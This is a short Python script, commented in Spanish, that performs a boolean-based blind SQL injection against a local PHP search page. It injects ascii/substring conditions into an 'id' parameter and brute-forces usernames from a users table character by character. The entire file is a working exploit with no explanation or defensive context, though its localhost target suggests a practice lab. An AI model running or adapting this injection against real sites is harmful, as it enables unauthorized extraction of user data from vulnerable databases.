#!/usr/bin/python3
from pwn import *

import requests
import string
import signal
import sys
import time

def def_handler(sig, frame):
    print("Saliendo...")
    sys.exit(1)

# CTRL+C
signal.signal(signal.SIGINT, def_handler)

# Variables
main_url = "http://localhost/searchUsers.php" 
characters = string.printable

def makeSQLi():

    p1 = log.progress("BruteForce...")
    p1.status("Iniciando proceso de BruteForce..")

    time.sleep(2)

    p2 = log.progress("Datos obtenidos")

    info = ""

    for position in range(1, 150):
        for character in range(33, 126):
            sqli_url = main_url + "?id=9 or (select(select ascii(substring((select group_concat(username) from users),%d,1)) from users where id = 1)=%d)" % (position, character)

            p1.status(sqli_url)

            r = requests.get(sqli_url)

            if r.status_code == 200:
                info += chr(character)
                p2.status(info)
                break

if __name__ == "__main__":
    
    makeSQLi()
